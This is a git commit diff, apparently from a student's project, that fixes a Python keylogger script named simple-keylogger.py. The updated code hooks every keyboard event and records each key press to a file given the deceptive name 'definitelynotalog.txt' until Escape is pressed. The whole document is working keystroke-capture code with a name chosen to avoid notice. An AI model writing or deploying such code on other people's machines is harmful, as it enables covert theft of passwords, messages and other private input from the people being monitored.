50130764e038c13ccebaa8ab12314fa577c6f013
Amraj Randhawa <randha13@my.yorku.ca>
2024-12-22 00:18:46 -0500

    fixed problems, now outputs to a log file!

--- simple-keylogger.py
+++ simple-keylogger.py
@@ -1,19 +1,20 @@
 import keyboard
 
-
+f = open("definitelynotalog.txt", "w")
 
 #this will record all key press downs. 
-with open("definitelynotalog.txt", "w") as f:
-    def key_event(event):
-        if event.event_type == 'down':
-            f.write((f"Key: {event.name}"))
-            f.flush # write immediately
+
+def key_event(event):
+    if event.event_type == 'down':
+        f.write((f"Key: {event.name}\n"))
+        f.flush() # write immediately
 
 
 #hook monitors all keyboard events.
-    keyboard.hook(key_event)
+keyboard.hook(key_event)
     
 #cancels when 'esc' is pressed.
 keyboard.wait('esc')
 
 
+f.close()
